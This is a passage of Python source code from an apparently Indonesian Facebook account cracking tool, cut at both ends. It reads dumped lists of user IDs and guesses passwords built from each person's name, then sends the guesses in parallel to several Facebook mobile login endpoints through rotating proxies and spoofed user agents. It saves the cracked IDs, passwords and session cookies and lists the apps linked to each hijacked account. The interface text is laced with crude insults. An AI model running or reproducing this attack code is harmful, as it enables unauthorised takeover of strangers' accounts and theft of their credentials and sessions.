					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						xy = random.choice([m,k,h,u,b,x])
						print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/WAWAN-DUMP')
	except FileNotFoundError:
		print('[😭] \x1b[38;5;226mFile Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f'{x}[💀] 1. Akun Old ')) 
	cetak(nel('[😊] 2. Akun New ')) 
	print('')
	hu = input('\x1b[38;5;196m=\x1b[38;5;231m=\x1b[1;96m=> \x1b[38;5;231mPilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	cetak(nel('1. Mobile ')) 
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('[😒] \x1b[38;5;226mPilih Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('[🤔] Tambahkan Aplikasi ( Y/t ) ')
	if _jembot_ in ['']:
		print('[😒] \x1b[38;5;226mPilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('[🤔] Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('[😁] Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel(f'>>>>> {m}•{k}•{h}•{x} \x1b[38;5;231mSedang Melihat \x1b[38;5;46mKontol bapakau{m}•{k}•{h}•{x} <<<<< ')) 
	print('')
	print(f'[😁] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'[😁] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	cetak(nel(f'[✈] Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')) 
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	cetak(nel(f'[{b}•{x}]{h} OK : {h}%s '%(ok))) 
	cetak(nel(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))) 
	print('')
	print('===> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('{===> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rMeledak kool{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = ('Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r{x}——>{k} {idf}|{pw}{N}')) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					cetak(nel(f'\r{x}——> {H}{idf}|{pw}|{kuki}{N}')) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					#os.popen('play-audio data/ok.mp3')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					cetak(nel(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')) 
					#os.popen('play-audio data/ok.mp3')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fhome.php%3Fref_component%3Dmfreebasic_home_header%26ref_page%3D%252Fwap%252Fhome.php%26refid%3D7%26paipv%3D0%26eav%3DAfZWKjietD8SAbQ50Sz_do4QKX58-H8l8DzMTfqXDmSeKmTCLkfz8m-pN4MLJ9_ikBs%26tbua%3D1%26subno_key%3DAaGn-YxfUWqsOJ0KvCq4CSN_x8kQPxY0T9m3OQSLtk_JkgACzqAoG35foPMh5x5UHJkg2GeqeDxnIv8MASrUR6gWQXZK8Q_1LItsBpHpUb3g07aNLW1sj6TIwTSBuoM2EQuOoaZkYInls_jKzGdyeubX8yKjmBQ6RdgUMgMW7QjL1VX1VuwXwDzQKNdrVSQt0E-G3qAS5zAu_aG3O11SI3uRapb2whoq6vqM7hCGMtk_ANe7gYpNfhJiHVbEukdl56SncBSmZ_Ge0nGiW3IHCqRvmyGNQ77vs35A_Dv4ILaVSY8xO9_Ltnao_U4C0uINfNQ%26hrc%3D1%26refsrc%3Ddeprecated&refsrc=deprecated&refid=7&ref_component=mfreebasic_home_header&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio .cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
				#os.popen('play-audio .ok.mp3')
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1

#			if "checkpoint" in po.cookies.get_dict().keys():
#				print(f'\r{K}>> {idf}|{pw}{N}')     
#				os.popen('play-audio .cp.mp3')
#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
#				akun.append(idf+'|'+pw)
#				cp+=1
#				break
#			elif "c_user" in ses.cookies.get_dict().keys():
#				ok+=1
#				coki=po.cookies.get_dict()
#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
#				os.popen('play-audio .ok.mp3')
#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
#				cek_apk(session,coki)
#				break
#				
#			else:
#				continue
#		except requests.exceptions.ConnectionError:
#			time.sleep(31)
#	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='AOREC-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOpUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
